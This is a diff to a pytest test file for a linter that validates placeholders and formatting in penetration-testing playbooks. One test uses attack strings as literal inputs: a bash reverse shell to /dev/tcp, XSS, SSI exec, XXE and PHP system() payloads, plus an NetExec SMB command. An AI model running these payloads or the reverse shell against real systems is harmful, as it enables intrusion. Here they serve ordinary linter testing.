@@ -1,5 +1,6 @@
 import pytest
 
+import conftest
 from conftest import SMB
 
 import build
@@ -56,9 +57,62 @@ def test_case_typo(tree):
     ]
 
 
-def test_unlisted_angle_text_is_literal(tree):
-    repo = tree({"02-enum/smb.md": body("<Directory /var/www>", "List<String> x", "<Foo>")})
+@pytest.mark.parametrize("name", ["User", "AttackerIP", "T", "DC"])
+def test_a_capitalised_name_that_is_not_listed_is_refused(tree, name):
+    repo = tree({"02-enum/smb.md": body("ok", f"nxc smb <TargetIP> -u '<{name}>'")})
+    assert problems(repo) == [f"playbooks/02-enum/smb.md:4: <{name}> is not in placeholders.toml"]
+
+
+def test_other_angle_text_is_literal(tree):
+    repo = tree({"02-enum/smb.md": body(
+        "<Directory /var/www>",
+        "<script>alert(1)</script>",
+        '<!--#exec cmd="id" -->',
+        "<user><name>&xxe;</name></user>",
+        "bash -i >& /dev/tcp/<TargetIP>/443 0>&1",
+        "cat <<'EOF'",
+        "<?php system('id'); ?>",
+    )})
     assert problems(repo) == []
+
+
+UNLISTED = conftest.PLACEHOLDERS + '\n[unlisted]\nsmb = ["String", "Directory"]\n'
+
+
+def test_the_unlisted_table_lets_a_name_through_in_its_playbook_only(tree):
+    files = {"02-enum/smb.md": body("List<String> x", "<Directory>"), "02-enum/ftp.md": body("List<String> x")}
+    assert problems(tree(files, placeholders=UNLISTED)) == [
+        "playbooks/02-enum/ftp.md:3: <String> is not in placeholders.toml"
+    ]
+
+
+@pytest.mark.parametrize(
+    "table, expected",
+    [
+        ('unlisted = "String"\n', "placeholders.toml: unlisted: needs a table of playbook = [names]"),
+        ('[unlisted]\nSmb = ["String"]\n', "placeholders.toml: unlisted: Smb: not a playbook's file name"),
+        ('[unlisted]\nsmb = "String"\n', "placeholders.toml: unlisted: smb: needs a list of names"),
+        ('[unlisted]\nsmb = []\n', "placeholders.toml: unlisted: smb: needs a list of names"),
+        ('[unlisted]\nsmb = ["string"]\n',
+         "placeholders.toml: unlisted: smb: a name is a capital letter, then letters and digits"),
+        ('[unlisted]\nsmb = ["Replace"]\n',
+         "placeholders.toml: unlisted: smb: Replace is reserved for the run block"),
+        ('[unlisted]\nsmb = ["Username"]\n', "placeholders.toml: unlisted: smb: Username is a placeholder"),
+        ('[unlisted]\nftp = ["String"]\n', "placeholders.toml: unlisted: ftp: no playbook has that name"),
+    ],
+)
+def test_unlisted_table_rules(tree, table, expected):
+    if table.startswith("unlisted ="):
+        toml = table + conftest.PLACEHOLDERS
+    else:
+        toml = conftest.PLACEHOLDERS + "\n" + table
+    repo = tree({"02-enum/smb.md": SMB}, placeholders=toml)
+    assert problems(repo) == [expected]
+
+
+def test_a_broken_placeholder_list_does_not_report_every_name(tree):
+    repo = tree({"02-enum/smb.md": SMB}, placeholders="[other]\n")
+    assert problems(repo) == ["placeholders.toml: needs a [placeholders] table"]
 
 
 @pytest.mark.parametrize(
@@ -69,6 +123,9 @@ def test_unlisted_angle_text_is_literal(tree):
         ("text ##########@@@@@@@@@@ text", "a fold marker"),
         ("#" * 20, "a line of 20 or more #"),
         ("#" * 31, "a line of 20 or more #"),
+        ("```", "a code fence"),
+        ("```vba", "a code fence"),
+        ("  ```", "a code fence"),
         ("> [!tip] Signing", "an Obsidian callout"),
         ("see [[SMB]] for more", "an Obsidian [[link]]"),
         ("END OF smb PLAYBOOK", "a line the run block's search would stop at"),
@@ -99,6 +156,8 @@ def test_front_matter(tree):
         ("#   \n\nx\n", "the title is empty"),
         ("# SMB   enumeration\n\nx\n", "a title holds no run of three spaces"),
         ("# SMB <TargetIP>\n\nx\n", "a title holds no <"),
+        ("# SMB ##########@@@@@@@@@@\n\nx\n", "a fold marker"),
+        ("# @@@@@@@@@@########## SMB\n\nx\n", "a fold marker"),
     ],
 )
 def test_title_rules(tree, text, message):
